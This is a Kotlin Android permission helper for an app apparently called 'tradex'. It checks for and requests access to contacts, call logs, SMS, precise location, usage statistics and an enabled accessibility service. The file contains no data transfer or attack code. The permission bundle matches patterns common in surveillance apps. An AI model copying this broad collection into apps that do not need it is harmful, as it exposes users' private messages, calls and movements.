package com.example.tradex

import android.Manifest
import android.accessibilityservice.AccessibilityServiceInfo
import android.app.Activity
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.provider.Settings
import android.view.accessibility.AccessibilityManager
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

object PermissionManager {

    const val REQUEST_CODE_ALL_PERMISSIONS = 100
    const val REQUEST_CODE_USAGE_STATS = 101
    const val REQUEST_CODE_ACCESSIBILITY = 102

    private val REQUIRED_PERMISSIONS = arrayOf(
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_SMS,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION
    )

    fun hasAllRequiredPermissions(context: Context): Boolean {
        
        return REQUIRED_PERMISSIONS.all {
            ContextCompat.checkSelfPermission(context, it) == PackageManager.PERMISSION_GRANTED
        } && isUsageStatsPermissionGranted(context) && isAccessibilityServiceEnabled(context)
    }

    fun requestAllPermissions(activity: Activity) {
        ActivityCompat.requestPermissions(activity, REQUIRED_PERMISSIONS, REQUEST_CODE_ALL_PERMISSIONS)
    }

    // Check if the app has access to usage stats
    fun isUsageStatsPermissionGranted(context: Context): Boolean {
        val usm = context.getSystemService(Context.USAGE_STATS_SERVICE) as android.app.usage.UsageStatsManager
        val stats = usm.queryUsageStats(
            android.app.usage.UsageStatsManager.INTERVAL_DAILY,
            System.currentTimeMillis() - 1000 * 60 * 60 * 24,
            System.currentTimeMillis()
        )
        return stats.isNotEmpty()
    }

    // Request the user to enable usage stats permission
    fun requestUsageStatsPermission(activity: Activity) {
        val intent = Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)
        activity.startActivityForResult(intent, REQUEST_CODE_USAGE_STATS)
    }

    // Check if location permissions are granted
    fun hasLocationPermissions(context: Context): Boolean {
        return ContextCompat.checkSelfPermission(
            context,
            Manifest.permission.ACCESS_FINE_LOCATION
        ) == PackageManager.PERMISSION_GRANTED &&
                ContextCompat.checkSelfPermission(
                    context,
                    Manifest.permission.ACCESS_COARSE_LOCATION
                ) == PackageManager.PERMISSION_GRANTED
    }

    // Request location permissions specifically
    fun requestLocationPermissions(activity: Activity) {
        ActivityCompat.requestPermissions(
            activity,
            arrayOf(
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION
            ),
            REQUEST_CODE_ALL_PERMISSIONS
        )
    }

    // Check if Accessibility Service is enabled
    fun isAccessibilityServiceEnabled(context: Context): Boolean {
        val am = context.getSystemService(Context.ACCESSIBILITY_SERVICE) as AccessibilityManager
        val enabledServices = Settings.Secure.getString(
            context.contentResolver,
            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        )
        val packageName = context.packageName

        return enabledServices?.split(":")?.any { it.startsWith("$packageName/") } == true &&
                am.getEnabledAccessibilityServiceList(AccessibilityServiceInfo.FEEDBACK_ALL_MASK)
                    .any { it.resolveInfo.serviceInfo.packageName == packageName }
    }

    // Request the user to enable the Accessibility Service
    fun requestAccessibilityPermission(activity: Activity) {
        val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
        activity.startActivityForResult(intent, REQUEST_CODE_ACCESSIBILITY)
    }
}
